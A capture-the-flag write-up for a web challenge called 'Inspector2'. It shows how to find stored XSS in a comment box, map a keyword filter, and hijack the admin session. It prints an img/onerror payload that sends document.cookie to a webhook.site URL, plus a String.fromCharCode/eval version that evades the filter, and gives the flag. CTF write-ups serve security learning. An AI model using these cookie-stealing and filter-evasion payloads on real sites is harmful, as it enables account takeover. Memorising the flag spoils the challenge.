# Inspector2 walkthrough:

### Step1 (Analysing):
> ##### After examining the site, here what interest us:
> * `/register` & `/login` creates an account and login with it, the site uses **flask session cookies**.
> * `/home` a simple web page with a static post and some static & dynamic comments (the alert(1) comment is a __hint__ from author) and **post** comment functionality, we also see a comment in the html while inspecting the code that tells us we won't find the flag by just inspecting the code like inspector1. 
> * `/add_page` which says it still under development.
> * `/admin` page which is 403 restricted (our **goal** is to access this page).
> * `/logout` button which destroys our session and redirect us to /login.

### Step2 (Testing for xss):
> ###### We start testing for xss by doing! 
> ```
> <script>alert(1)</script>
> ```
> ###### we get `blocked` so there is a filter, we test for what the filter blocks, we try: 
> ```
> <img src=x onerror=alert(1) />
> ```
> ###### **XSS executed** we got our alert pop up!

### Step3 (making the payload):
> ###### Now we need to get the admin cookie via xss,we open [https://webhook.site](https://webhook.site) and we try:
> ```
> <img src=x onerror=fetch('https://webhook.site/00d80bc3-4b9b-4cda-82a4-62f78b425df7?c='+document.cookie) />
> ```
> ###### and we get `Blocked` again, we need to figure out what is blocked in our site by trying each word of our payload individually, we find that `['script', 'cookie', 'document', 'http', 'fetch', 'https', 'script']` are blocked.
### Step4 (escaping the payload):
> ###### We need a payload that works and steals admin's cookie for us, but do not contains the blocked words, there is thousands ways to do that, you will find interesting filter bypass payloads online, you can simply wrap our payload in an eval function like this: 
> ```
> <img src=x onerror=eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,53,99,49,101,54,98,49,52,45,55,50,98,56,45,52,52,52,52,45,97,100,50,56,45,55,50,49,99,54,50,97,98,56,51,98,53,63,99,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41)) />
> ```
> ###### like this we will get 2 requests in our webhook, 1st one with our cookie (we trigger the xss call because we submitted a comment), and after seconds we will get a second request with a different cookie (**the admin cookie**).
> ###### we go to `/admin` and go to **inspect** (rightClick + inspect) we go to our cookie (storage->cookie in firefox & application -> cookie in chrome) we change the value of **session** cookie to the cookie we get and do a simple refresh.
> ###### And **"BOOM"** we get our flag **CSCC{d0m_x55_adm1n_pwn3d_innerHTmL}**
